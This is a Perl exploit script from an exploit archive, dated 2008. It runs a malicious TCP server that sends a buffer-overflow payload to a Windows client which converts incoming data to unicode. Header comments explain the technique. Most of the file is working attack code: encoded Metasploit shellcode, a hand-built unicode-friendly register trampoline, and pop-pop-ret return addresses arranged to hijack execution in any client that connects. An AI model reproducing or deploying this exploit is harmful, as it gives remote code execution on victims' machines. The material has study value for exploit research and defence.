#!/usr/bin/perl
# k`sOSe - 08/24/2008

# This is a useless and not portable exploit code, tested only on my winxp-sp3 VM.
# I was looking for a vuln to write an exploit for when I found this PoC:
#
# http://www.milw0rm.com/exploits/5817
#
# The author wrote:
# 	"The reason why there isnt any shellcode here is because the client is 
# 	coverting the junk/buffer data to unicode so its corrupting the shellcode,
# 	ive tried sending unicode buffer but the same problem occurs.
# 	if anyone else can get further please let me know. but i doubt you can"
#
# It is for this reason, a small suggestion of impossibility(copyright Phantasmal Phantasmagoria)
# that i decided to write this. Actually it was pretty funny :)
#
# The first problem is how to redirect the execution flow to our buffer, the buffer can be found
# at three different locations: 
#  - at some address on the stack converted to unicode 
#  - at some address on the heap again converted to unicode 
#  - at some address on the heap in plain ASCII
#
# Unfortunately none of these addresses are unicode friendly :(.
# But.. there is an address on the stack that points in the middle of the buffer(the one on the 
# stack), all we need is to pop the stack 6 times and then return.
# To achieve this we return 2 times on a unicode friendly pop,pop,pop,ret.
# 
# The second problem is that the buffer on the stack is converted to unicode(so \x41 -> \x00\x41)
# *and* must be, with some exceptions, in the \x01 -> \x59 space... so I decided to write a 
# unicode friendly ASM stub that will load the address of the ASCII version of the buffer in EAX 
# using offsets from a register(somewhat related to our buffer), push it and then return.
#
# On my box this works 100 times out of 100 :)

use warnings;
use strict;
use IO::Socket;

my $sock = IO::Socket::INET->new( Proto => 'tcp', LocalPort => '16667', Listen => SOMAXCONN, Reuse => 1 );

my $ret 	=	"\xa2\x41" ;  # pop, pop, pop, ret

# metasploit shellcode
my $shellcode =
"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a" .
"\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48" .
"\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51" .
"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43" .
"\x4a\x4a\x49\x4b\x4c\x4b\x58\x50\x44\x45\x50\x45\x50\x45" .
"\x50\x4c\x4b\x47\x35\x47\x4c\x4c\x4b\x43\x4c\x45\x55\x44" .
"\x38\x45\x51\x4a\x4f\x4c\x4b\x50\x4f\x45\x48\x4c\x4b\x51" .
"\x4f\x47\x50\x43\x31\x4a\x4b\x47\x39\x4c\x4b\x50\x34\x4c" .
"\x4b\x43\x31\x4a\x4e\x46\x51\x49\x50\x4c\x59\x4e\x4c\x4b" .
"\x34\x49\x50\x42\x54\x44\x47\x49\x51\x48\x4a\x44\x4d\x43" .
"\x31\x49\x52\x4a\x4b\x4c\x34\x47\x4b\x46\x34\x46\x44\x44" .
"\x44\x43\x45\x4a\x45\x4c\x4b\x51\x4f\x51\x34\x43\x31\x4a" .
"\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45" .
"\x4c\x45\x51\x4a\x4b\x4c\x4b\x45\x4c\x4c\x4b\x45\x51\x4a" .
"\x4b\x4d\x59\x51\x4c\x47\x54\x44\x44\x48\x43\x51\x4f\x50" .
"\x31\x4c\x36\x45\x30\x50\x56\x42\x44\x4c\x4b\x47\x36\x46" .
"\x50\x4c\x4b\x51\x50\x44\x4c\x4c\x4b\x44\x30\x45\x4c\x4e" .
"\x4d\x4c\x4b\x43\x58\x45\x58\x4c\x49\x4c\x38\x4b\x33\x49" .
"\x50\x43\x5a\x46\x30\x45\x38\x4c\x30\x4d\x5a\x44\x44\x51" .
"\x4f\x42\x48\x4c\x58\x4b\x4e\x4c\x4a\x44\x4e\x51\x47\x4b" .
"\x4f\x4a\x47\x47\x33\x47\x4a\x51\x4c\x50\x57\x50\x49\x50" .
"\x4e\x50\x44\x50\x4f\x46\x37\x46\x33\x51\x4c\x42\x53\x42" .
"\x59\x44\x33\x44\x34\x43\x55\x42\x4d\x47\x43\x50\x32\x51" .
"\x4c\x43\x53\x45\x31\x42\x4c\x45\x33\x46\x4e\x45\x35\x42" .
"\x58\x45\x35\x43\x30\x45\x5a\x41\x41";


# Black magic unicode friendly ASM stub that will load the shellcode address 
# using offsets from a register that points near the shellcode.
my $trampoline	=	"\x52" . # push edx
			"\x42" .
			"\x58" . # pop eax 
			"\x42" .
			"\x55" . # push ebp
			"\x42" . 
			"\x44" . # inc esp
			"\x42" . 
			"\x44" . # inc esp
			"\x42" . 
			"\x59" . # pop ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x41" . # inc ecx
			"\x42" .
			"\x51" . # push ecx
			"\x42" .
			"\x4c" . # dec esp
			"\x42" .
			"\x59" . # pop ecx
			"\xec" . # add ah,ch
			"\x42" .  
			"\x50" . # push eax
			"\x42" . 
			"\x5e" . # pop esi
			"\x42" .
			"\x51" . # push ecx
			"\x42" .
			"\x44" . # inc esp
			"\x42" .
			"\x58" . # pop eax
			"\x42" .
			"\x54" . # push esp
			"\x42" .
			"\x5b" . # pop ebx
			"\x42" .
			"\x56" . # push esi
			"\x42" .
			"\x4B" . # dec ebx
			"\x42" .
			"\x4B" . # dec ebx
			"\x42" .
			"\x4b" . # dec ebx
			"\x42" .
			"\x4b" . # dec ebx
			"\x42" .
			"\x48" . # dec eax
			"\x42" .
			"\x48" . # dec eax
			"\x42" .
			"\x48" . # dec eax
			"\x42" .
			"\x48" . # dec eax
			"\x03" . # ADD BYTE PTR DS:[EBX],AL
			"\x03" . # ADD BYTE PTR DS:[EBX],AL
			"\x03" . # ADD BYTE PTR DS:[EBX],AL
			"\x03" . # ADD BYTE PTR DS:[EBX],AL
			"\x42" .
			"\x58" . # pop eax
			"\x42" .
			"\x44" . # inc esp // realign stack pointer
			"\x42" .
			"\x44" . # inc esp // realign stack pointer
			"\x42" .
			"\x50" . # push eax
			"\x42" .
			"\xc3" ; # ret

my $buf2 =	$shellcode .
		"\x41" x (784-length($shellcode)) .
		$trampoline	.
		"\x62" x 158	.
		$ret .  
		"\x41" x 6	.
		$ret;

while(my $client = $sock->accept()) {
    print $client "$buf2\r\n";
}

# milw0rm.com [2008-08-25]